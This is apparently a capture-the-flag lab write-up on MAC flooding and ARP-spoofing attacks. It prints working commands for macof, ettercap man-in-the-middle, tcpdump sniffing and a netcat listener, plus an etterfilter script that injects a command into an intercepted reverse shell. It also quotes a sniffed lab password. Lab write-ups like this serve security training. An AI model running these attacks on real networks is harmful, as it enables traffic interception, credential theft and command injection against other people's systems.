# L2 MAC Flooding & ARP Spoofing

Spent Saturday night on some rooms and this one was an interesting one. let me see if I can make this write up look clear, nice and short

## Intro

The room walks thrrough the OSI model layer 2 network switches, MAC tables, Address Resolution Protocol (ARP) and Wireshark. A very interesting room
So, we are given two target machine Ip address, and you know how this goes, right? Nah follow along. Machine one is for understanding the network flow and machine two is for utilizing ARP spoofing


## Machine 1
### Initial Access

Assuming we have attained initial access and escalated privilege to root on a linux mahcine and during your OS enumeration, you realize it is a dual homed host. Mate, we definitely have to check it out because there are chances we could move laterally

Dual homed host simply means it is connected to two or more networks.

### Network Discovery

![image alt](https://github.com/bakel243687/TryHackme/blob/cb8d5258db3faf2d69014776017e5cae1c4930db/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_00-45-02.png)

So, upon logging into the target machine, I checked the network interface using ifconfig and I got the IP address of our target network and then did our network discovery with nmap, but unlike our usual port scan, we are only trying to discover host on the network so I made use of the below flag
> nmap -sn <IP-ADDRESS>

Upon scan completion, I discovered two other machines on the network, Alice and Bob. I performed a port scan on both machines and got the open ports on these machines

### Network Sniffing
Now, Inorder to get info on the other machines on the network, I made use of tcpdump to capture the packets of the other machines and got Bob sending ICMP packets to Eve which is the machine I ssh into.

![image alt](https://github.com/bakel243687/TryHackme/blob/cb8d5258db3faf2d69014776017e5cae1c4930db/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_00-54-55.png)

Using the command, tcpdump -A -i eth1 -w /tmp/tcpdump.pcap, I can sniff packets from the network and store as a .pcap file for use in wireshark.

![image alt](https://github.com/bakel243687/TryHackme/blob/cb8d5258db3faf2d69014776017e5cae1c4930db/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_00-55-08.png)

With the .pcap file created with the packets in it, I can share it to my own kali machine using scp command.

![image alt](https://github.com/bakel243687/TryHackme/blob/cb8d5258db3faf2d69014776017e5cae1c4930db/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_00-55-20.png) 
![image alt](https://github.com/bakel243687/TryHackme/blob/cb8d5258db3faf2d69014776017e5cae1c4930db/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_00-55-28.png)
_image: pakets on wireshark_

We've got a little info on the activities on the network but it's not enough to take action. This is where we introduce ettercap, it is an open source network security tool capable of sniffing of live connections, content filtering on the fly, and many other features. It supports active and passive dissection of many protocols (including ciphered protocols) and includes many features for network and host analysis.

## MACHINE 2

### Sniffing

![image alt](https://github.com/bakel243687/TryHackme/blob/cb8d5258db3faf2d69014776017e5cae1c4930db/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_01-25-01.png)

Before jumping into ettercap, I first made use of macof alongside tcpdump to flood the switch and capture the packets. Running the two commands below simultaneously.
> tcpdump -A -i eth1 -w /tmp/tcpdump2.pcap
> macof -i eth1

The use of ettercap as shown below is noisy and will be easily detected in a secured system.
Loading up the second target machine. It's still the same machines and hostnames on the network, but different IP address and open ports

![image alt](https://github.com/bakel243687/TryHackme/blob/cac80fc0999b184c5b23d0cd5a756df3470c466f/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_01-52-03.png)

On performing an nmap scan, I used the same nmap -sn just like before. Then did port scan for both Alice and Bob machines, got port 80 open on Bob's and port 4444 on Alice's machine.

![image alt](https://github.com/bakel243687/TryHackme/blob/cac80fc0999b184c5b23d0cd5a756df3470c466f/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_01-52-15.png)
_The above image shows that the web server requires authentication to access_

![image alt](https://github.com/bakel243687/TryHackme/blob/cac80fc0999b184c5b23d0cd5a756df3470c466f/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_01-52-24.png)

Utilizing ettercap, I used the below command
> ettercap -T -i eth1 -M arp

- -T flag give us a text only interface
- -i flag give us the option to select the network interface and in our case, its eth1
- -M is the man-in-the-middle attack and together with arp specifies arp poisoning mitm attack

![image alt](https://github.com/bakel243687/TryHackme/blob/cac80fc0999b184c5b23d0cd5a756df3470c466f/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_01-52-37.png)
![image alt](https://github.com/bakel243687/TryHackme/blob/cac80fc0999b184c5b23d0cd5a756df3470c466f/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_01-52-45.png)

The result of the sniffing using ettercap gave me this 

Discovered the content of Bob's http service and also got info on a reverse shell. The content of the http server can only be accessed with authentication which I saw in the result of this ettercap arp spoofing. Picked up the commands of the shell and the results of the commands including the ls command which had our root.txt file on the result as well as the username and password to login to the website
> admin:s3cr3t_P4zz

![image alt](https://github.com/bakel243687/TryHackme/blob/cac80fc0999b184c5b23d0cd5a756df3470c466f/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_01-54-25.png)

With the username and password to access the web server I used curl on the werver as in the image above

### Manipulation

How do we make use of the above information? stay with me

Here is where things get very interesting as I have to utiliae a -F option in ettercap called etterfilter. It allows me to apply filters in the form of specified etterfilter.ef files for the session. These files just like C code are compiled from the etterfilter source filter file to .ecf files. 
Note: For the sake of this room, we are only going to manipulate her commands and won't be taking any OPSEC precautions

Now, I created my whoami.ef file, you can name the file anything by the way.

The plan is to intercept the commands on the reverse shell and change one of the commands to what we want. This can be done using any language of your choice ny inputting it into your .ef file. 

I made use of etterfilter script and below is the code

```Etterfilter script
if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
  log(DATA.data, "/root/ettercap.log");
  replace("whoami", "cat root/root.txt" );
  msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");
}
```

![image alt](https://github.com/bakel243687/TryHackme/blob/cac80fc0999b184c5b23d0cd5a756df3470c466f/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_02-19-33.png)

I compiled the .ecf file adn started up my netcat listener ready to manipulate the commands with 
> etterfilter whoami.ecf -o whoami.ef
> nc -nvlp 6666

Then I allowed traffic from the eth1 using the below rule
> ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 6666 proto tcp
or better still you can disable  your firewall, ufw

![image alt](https://github.com/bakel243687/TryHackme/blob/cac80fc0999b184c5b23d0cd5a756df3470c466f/Walkthroughs/Images/L2%20MAC%20Flooding%20%26%20ARP%20Spoofing/Screenshot_2025-11-09_02-19-42.png)

Having done all this, I can now run the below command to execute the ettercap along with the etterfilter file 
> ettercap -T -i eth1 -M arp -F whoami.ef

Now, we can close quit the ettercap after a while and enjoy the shell result. 
